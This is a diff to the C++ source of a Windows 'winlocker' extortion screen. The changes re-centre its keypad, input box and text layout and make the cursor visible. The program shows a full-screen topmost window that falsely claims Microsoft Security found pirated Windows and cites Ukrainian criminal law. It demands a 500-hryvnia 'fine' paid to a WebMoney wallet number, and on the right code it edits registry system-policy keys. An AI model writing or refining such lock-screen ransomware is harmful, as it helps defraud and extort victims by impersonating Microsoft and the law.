@@ -6,6 +6,8 @@
 #include <string>
 #include <vector>
 
+#pragma execution_character_set("utf-8") // Принудительно UTF-8 для русского текста
+
 // Пароль для разблокировки (в данном случае "1234")
 static const std::wstring kPassword = L"1234";
 
@@ -22,12 +24,15 @@ struct Button {
 
 static std::vector<Button> g_buttons;
 
-static void InitButtons() {
+static void InitButtons(int screenW, int screenH) {
     g_buttons.clear();
-    // Цифровая клавиатура (1-9, 0, Backspace)
-    std::wstring keys[] = {L"1", L"2", L"3", L"4", L"5", L"6", L"7", L"8", L"9", L"0", L"<-"};
-    int startX = 100, startY = 560;
+    // Центрируем клавиатуру по экрану
     int btnW = 50, btnH = 40, gap = 10;
+    int totalW = 6 * (btnW + gap) - gap; 
+    int startX = (screenW - totalW) / 2;
+    int startY = screenH - 200; // Отступ снизу
+
+    std::wstring keys[] = {L"1", L"2", L"3", L"4", L"5", L"6", L"7", L"8", L"9", L"0", L"<-"};
     
     for (int i = 0; i < 11; i++) {
         int row = i / 6;
@@ -35,8 +40,8 @@ static void InitButtons() {
         g_buttons.push_back({startX + col * (btnW + gap), startY + row * (btnH + gap), btnW, btnH, keys[i]});
     }
     
-    // Кнопка "Разблокировать"
-    g_buttons.push_back({800, 560, 200, 40, L"разблокировать"});
+    // Кнопка "Разблокировать" справа от поля ввода
+    g_buttons.push_back({screenW / 2 + 150, startY + 10, 200, 40, L"разблокировать"});
 }
 
 // ---------- Persistence ----------
@@ -82,11 +87,11 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         int sw = GetSystemMetrics(SM_CXSCREEN);
         int sh = GetSystemMetrics(SM_CYSCREEN);
         SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
-        ShowCursor(FALSE);
+        ShowCursor(TRUE); // Курсор теперь виден!
         g_hwnd = h;
         SetForegroundWindow(h);
         SetFocus(h);
-        InitButtons();
+        InitButtons(sw, sh);
         return 0;
     }
     case WM_PAINT: {
@@ -94,13 +99,13 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         HDC dc = BeginPaint(h, &ps);
         RECT rc; GetClientRect(h, &rc);
         
-        // 1. Фон (голубой градиент/цвет как на скрине)
+        // Фон (голубой)
         HBRUSH bg = CreateSolidBrush(RGB(0, 102, 204));
         FillRect(dc, &rc, bg);
         DeleteObject(bg);
         
-        // 2. Темно-синяя рамка для текста
-        RECT rcBox = rc; rcBox.left += 50; rcBox.top += 20; rcBox.right -= 50; rcBox.bottom -= 50;
+        // Темно-синяя рамка для текста
+        RECT rcBox = rc; rcBox.left += 50; rcBox.top += 20; rcBox.right -= 50; rcBox.bottom -= 250; // Оставили место для кнопок
         HBRUSH boxBg = CreateSolidBrush(RGB(0, 51, 153));
         FillRect(dc, &rcBox, boxBg);
         DeleteObject(boxBg);
@@ -108,19 +113,18 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         SetBkMode(dc, TRANSPARENT);
         SetTextColor(dc, RGB(255, 255, 255));
 
-        // 3. Шрифты
         HFONT fTitle = CreateFontW(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Arial");
         HFONT fText = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Arial");
         HFONT fBtn = CreateFontW(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Arial");
         
-        // Заголовок
+        // Заголовок (выровнен по центру экрана)
         SelectObject(dc, fTitle);
         RECT rcTitle = rc; rcTitle.top = 25; rcTitle.bottom = 70;
         DrawTextW(dc, L"Windows заблокирован!", -1, &rcTitle, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
         
-        // Основной текст
+        // Основной текст (сдвинут вниз)
         SelectObject(dc, fText);
-        RECT rcText = rcBox; rcText.left += 20; rcText.top += 20;
+        RECT rcText = rcBox; rcText.left += 20; rcText.right -= 20; rcText.top += 80; 
         
         const wchar_t* mainText = 
             L"Microsoft Security обнаружил ПИРАТСКУЮ ВЕРСИЮ WINDOWS. Статья 176 УК Украины.\n"
@@ -133,7 +137,7 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
             L"Инструкция по оплате штрафа:\n"
             L"1. Найдите ближайший терминал для оплаты мобильной связи. Например iBox.\n"
             L"2. Выберите вкладку \"Оплата услуг\" (может отличаться в зависимости от терминала).\n"
-            L"3. Выберите \"Банки, страхование, Эл. коммерция\" (может отличаться в зависимости от терминала).\n"
+            L"3. Выберите \"Банки, страхование, Эл. коммерция\" (может отличаться от терминала).\n"
             L"4. Выберите \"WebMoney\".\n"
             L"5. Введите номер кошелька: U349966071813\n"
             L"6. Внесите в купюроприёмник сумму 500 гривен и совершите оплату.\n\n"
@@ -143,40 +147,37 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
             
         DrawTextW(dc, mainText, -1, &rcText, DT_LEFT | DT_TOP | DT_WORDBREAK);
 
-        // Нижняя синяя плашка (Статья)
-        RECT rcBottom = rc; rcBottom.top = rc.bottom - 70; rcBottom.bottom = rc.bottom - 20;
+        // Нижняя синяя плашка (Статья) прижата к низу темной рамки
+        RECT rcBottom = rcBox; rcBottom.top = rcBottom.bottom - 50;
         HBRUSH botBg = CreateSolidBrush(RGB(0, 51, 153));
         FillRect(dc, &rcBottom, botBg);
         DeleteObject(botBg);
         
         RECT rcBottomText = rcBottom; rcBottomText.left += 20; rcBottomText.right -= 20;
-        DrawTextW(dc, L"Ст. 176 УК Украины. Незаконное использование или распространение программного обеспечения либо другое\nумышленное нарушение авторского права. Лишение свободы сроком от 3-ех лет.", -1, &rcBottomText, DT_LEFT | DT_VCENTER | DT_WORDBREAK);
+        DrawTextW(dc, L"Ст. 176 УК Украины. Незаконное использование ПО либо другое умышленное нарушение авторского права. Лишение свободы от 3-ех лет.", -1, &rcBottomText, DT_LEFT | DT_VCENTER | DT_WORDBREAK);
 
         // Текст перед полем ввода
-        RECT rcPrompt = rc; rcPrompt.top = 530; rcPrompt.bottom = 560; rcPrompt.left = 400;
+        RECT rcPrompt = rc; rcPrompt.top = rc.bottom - 180; rcPrompt.bottom = rc.bottom - 150; rcPrompt.left = rc.left + 200;
         DrawTextW(dc, L"Ваш код:", -1, &rcPrompt, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
         // Поле ввода (белый прямоугольник)
-        RECT rcInput = rc; rcInput.left = 500; rcInput.top = 530; rcInput.right = 700; rcInput.bottom = 560;
+        RECT rcInput = rc; rcInput.left = rc.left + 300; rcInput.top = rc.bottom - 185; rcInput.right = rc.left + 600; rcInput.bottom = rc.bottom - 145;
         HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
         FillRect(dc, &rcInput, whiteBrush);
         DeleteObject(whiteBrush);
         
         // Введенный текст в поле
         SetTextColor(dc, RGB(0, 0, 0));
-        RECT rcInputText = rcInput; rcInputText.left += 5;
+        RECT rcInputText = rcInput; rcInputText.left += 10;
         DrawTextW(dc, g_input.c_str(), -1, &rcInputText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
         // Рисуем кнопки
         SelectObject(dc, fBtn);
         for (const auto& btn : g_buttons) {
             RECT rcBtn = {btn.x, btn.y, btn.x + btn.w, btn.y + btn.h};
-            
-            // Фон кнопки (серый/белый с рамкой)
             HBRUSH btnBg = CreateSolidBrush(RGB(240, 240, 240));
             FillRect(dc, &rcBtn, btnBg);
             DeleteObject(btnBg);
-            
             FrameRect(dc, &rcBtn, (HBRUSH)GetStockObject(GRAY_BRUSH));
             
             SetTextColor(dc, RGB(0, 0, 0));
@@ -186,21 +187,18 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         DeleteObject(fTitle);
         DeleteObject(fText);
         DeleteObject(fBtn);
-        
         EndPaint(h, &ps);
         return 0;
     }
     case WM_LBUTTONDOWN: {
         int x = LOWORD(l), y = HIWORD(l);
         
-        // Проверяем клики по кнопкам
         for (const auto& btn : g_buttons) {
             if (x >= btn.x && x <= btn.x + btn.w && y >= btn.y && y <= btn.y + btn.h) {
                 if (btn.text == L"<-") {
                     if (!g_input.empty()) g_input.pop_back();
                 } else if (btn.text == L"разблокировать") {
                     if (g_input == kPassword) {
-                        // Успех!
                         g_locked = false;
                         HKEY hk;
                         if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
@@ -250,7 +248,6 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         return 0;
     }
     case WM_DESTROY:
-        ShowCursor(TRUE);
         PostQuitMessage(0);
         return 0;
     }
